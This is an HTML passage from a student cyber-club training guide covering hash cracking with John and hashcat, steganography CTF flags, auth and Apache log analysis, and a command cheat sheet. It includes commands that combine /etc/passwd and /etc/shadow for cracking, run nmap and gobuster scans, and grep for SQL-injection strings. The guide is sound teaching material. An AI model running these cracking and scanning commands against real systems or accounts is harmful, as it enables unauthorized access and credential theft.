+<div class="step"><div class="num">1</div><div class="body">Identify the hash type before cracking. Hash-identifier is built into Kali:
+<span class="cmd">hash-identifier</span>
+Paste the hash at the prompt. It will guess the algorithm (MD5, SHA-1, bcrypt, etc.).</div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Crack an MD5 hash with John the Ripper using the rockyou wordlist:
+<span class="cmd">echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+<span class="out">Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+password         (?)
+1g 0:00:00:01 DONE</span></div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Show cracked passwords stored in John's pot file:
+<span class="cmd">john --show --format=raw-md5 hash.txt</span>
+<span class="out">?:password
+
+1 password hash cracked, 0 left</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Crack with hashcat (GPU-accelerated — faster on a real machine, educational here):
+<span class="cmd">hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force</span>
+<code>-m 0</code> is the mode for MD5. For SHA-1 use <code>-m 100</code>, for bcrypt use <code>-m 3200</code>.</div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Crack a Linux /etc/shadow entry. If the instructor provides one:
+<span class="cmd">unshadow /etc/passwd /etc/shadow > combined.txt
+john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt</span></div></div>
+
+<!-- STEGANOGRAPHY -->
+<h3 id="d5-stego">Part E: Steganography</h3>
+
+<div class="step"><div class="num">1</div><div class="body">Check if a flag is appended after the image data:
+<span class="cmd">tail -c 100 image.png | strings</span>
+<span class="out">FLAG{appended_to_end}</span></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Extract hidden data embedded with steghide (requires a passphrase your instructor gives you):
+<span class="cmd">steghide extract -sf image.jpg -p "password"</span>
+<span class="out">wrote extracted data to "flag.txt".</span>
+<span class="cmd">cat flag.txt</span></div></div>
+
+<div class="step"><div class="num">3</div><div class="body">If you do not know the passphrase, try an empty one (common in CTFs):
+<span class="cmd">steghide extract -sf image.jpg -p ""</span></div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Check for LSB (least-significant-bit) steganography using zsteg (PNG and BMP only):
+<span class="cmd">zsteg image.png</span>
+<span class="out">b1,r,lsb,xy     .. text: "FLAG{lsb_steg}"</span></div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Decode a QR code or barcode from an image:
+<span class="cmd">zbarimg image.png</span>
+<span class="out">QR-Code:FLAG{qr_code_flag}</span></div></div>
+
+<!-- LOG ANALYSIS -->
+<h3 id="d5-logs">Part F: Log analysis (blue-team)</h3>
+
+<div class="step"><div class="num">1</div><div class="body">View the most recent SSH login attempts:
+<span class="cmd">sudo grep "Failed password\|Accepted password" /var/log/auth.log | tail -30</span></div></div>
+
+<div class="step"><div class="num">2</div><div class="body">Count failed attempts per source IP to spot a brute-force:
+<span class="cmd">sudo grep "Failed password" /var/log/auth.log \
+  | awk '{print $11}' | sort | uniq -c | sort -rn | head -10</span>
+<span class="out">    342 192.168.1.105
+     18 10.0.0.44</span>
+The IP with 342 failures is almost certainly an automated attacker.</div></div>
+
+<div class="step"><div class="num">3</div><div class="body">Find the time window of the attack:
+<span class="cmd">sudo grep "Failed password.*192.168.1.105" /var/log/auth.log | head -1
+sudo grep "Failed password.*192.168.1.105" /var/log/auth.log | tail -1</span>
+Subtract the timestamps to see how fast the brute-force was running.</div></div>
+
+<div class="step"><div class="num">4</div><div class="body">Check if the attacker ever succeeded:
+<span class="cmd">sudo grep "Accepted password.*192.168.1.105" /var/log/auth.log</span>
+An entry here means the attacker got in — this is evidence of compromise.</div></div>
+
+<div class="step"><div class="num">5</div><div class="body">Search Apache web server logs for SQL injection attempts:
+<span class="cmd">sudo grep -i "union\|select\|1=1\|'--\|or%201" /var/log/apache2/access.log | head -20</span></div></div>
+
+<div class="step"><div class="num">6</div><div class="body">Find all IPs that requested a specific page (attacker may use scanners):
+<span class="cmd">sudo awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head</span></div></div>
+
+<!-- CTF WORKFLOW -->
+<h3 id="d5-ctf">Part G: CTF workflow and strategy</h3>
+
+<table>
+<tr><th>Step</th><th>What to do</th><th>Tools</th></tr>
+<tr><td>1. Read</td><td>Read the challenge description carefully. What category? What file or service do you have?</td><td>Your brain</td></tr>
+<tr><td>2. Identify</td><td>What type is the artifact? Binary, image, text, network service, web app?</td><td><code>file</code>, <code>xxd</code></td></tr>
+<tr><td>3. Enumerate</td><td>Gather information without changing anything. Scan ports, view source, list strings.</td><td><code>nmap</code>, <code>strings</code>, curl, browser DevTools</td></tr>
+<tr><td>4. Exploit</td><td>Apply the right technique for the category.</td><td>Category-specific (below)</td></tr>
+<tr><td>5. Submit</td><td>Copy the flag exactly including the <code>FLAG{}</code> wrapper. Case matters.</td><td>CTF scoreboard</td></tr>
+</table>
+
+<h4>Category quick-start</h4>
+<table>
+<tr><th>Category</th><th>First three things to try</th></tr>
+<tr><td>Web</td><td>View source (Ctrl+U), check robots.txt, open browser DevTools Network tab</td></tr>
+<tr><td>Cryptography</td><td>Is it Base64? Try dcode.fr for classical ciphers. Check for Caesar/ROT13.</td></tr>
+<tr><td>Forensics</td><td><code>file</code>, <code>strings | grep FLAG</code>, <code>exiftool</code>, <code>binwalk</code></td></tr>
+<tr><td>Steganography</td><td><code>strings</code>, <code>zsteg</code> (PNG), <code>steghide extract</code> (JPG), <code>binwalk -e</code></td></tr>
+<tr><td>Password</td><td>Identify hash type, check crackstation.net, then john or hashcat</td></tr>
+<tr><td>OSINT</td><td>Google exact phrases in quotes, check LinkedIn, Wayback Machine, Shodan</td></tr>
+<tr><td>Networking</td><td>Open in Wireshark, filter by protocol, follow TCP stream</td></tr>
+</table>
+
+<hr>
+
+<!-- QUICK REFERENCE -->
+<h2 id="quickref">Quick-Reference Cheat Sheet</h2>
+
+<table>
+<tr><th>Task</th><th>Command</th></tr>
+<tr><td>Start Wireshark</td><td><code>sudo wireshark &amp;</code></td></tr>
+<tr><td>Capture on eth0</td><td>Double-click eth0 in Wireshark welcome screen</td></tr>
+<tr><td>Follow TCP stream</td><td>Right-click packet → Follow → TCP Stream</td></tr>
+<tr><td>AES encrypt</td><td><code>openssl enc -aes-256-cbc -pbkdf2 -in file.txt -out file.enc</code></td></tr>
+<tr><td>AES decrypt</td><td><code>openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.txt</code></td></tr>
+<tr><td>Show TLS cert</td><td><code>echo | openssl s_client -connect HOST:443 2&gt;/dev/null | openssl x509 -noout -text</code></td></tr>
+<tr><td>SHA-256 hash</td><td><code>echo -n "text" | sha256sum</code></td></tr>
+<tr><td>MD5 hash</td><td><code>echo -n "text" | md5sum</code></td></tr>
+<tr><td>Base64 decode</td><td><code>echo "..." | base64 --decode</code></td></tr>
+<tr><td>Base64 encode</td><td><code>echo "text" | base64</code></td></tr>
+<tr><td>Start DVWA</td><td><code>sudo service apache2 start &amp;&amp; sudo service mysql start</code></td></tr>
+<tr><td>Launch Burp Suite</td><td><code>burpsuite &amp;</code></td></tr>
+<tr><td>Ping sweep</td><td><code>nmap -sn 10.0.0.0/24</code></td></tr>
+<tr><td>Service scan</td><td><code>nmap -sV -sC TARGET</code></td></tr>
+<tr><td>All ports</td><td><code>nmap -p- --min-rate 5000 TARGET</code></td></tr>
+<tr><td>Dir brute-force</td><td><code>gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt</code></td></tr>
+<tr><td>Identify file</td><td><code>file target</code></td></tr>
+<tr><td>Extract strings</td><td><code>strings -n 6 target | grep FLAG</code></td></tr>
+<tr><td>Hex dump</td><td><code>xxd target | head -10</code></td></tr>
+<tr><td>Scan for embedded</td><td><code>binwalk target</code></td></tr>
+<tr><td>Extract embedded</td><td><code>binwalk -e target</code></td></tr>
+<tr><td>EXIF metadata</td><td><code>exiftool image.jpg</code></td></tr>
+<tr><td>Steghide extract</td><td><code>steghide extract -sf image.jpg -p "passphrase"</code></td></tr>
+<tr><td>LSB stego (PNG)</td><td><code>zsteg image.png</code></td></tr>
+<tr><td>Crack MD5 (John)</td><td><code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></td></tr>
+<tr><td>Crack MD5 (hashcat)</td><td><code>hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force</code></td></tr>
+<tr><td>Auth log failures</td><td><code>sudo grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn</code></td></tr>
+</table>
+
+<p class="sub" style="margin-top:32px;border-top:1px solid #e2e8f0;padding-top:12px">Bowie State University - Cyber Squad 2026 - devharsh.1592@gmail.com</p>
+</body></html>
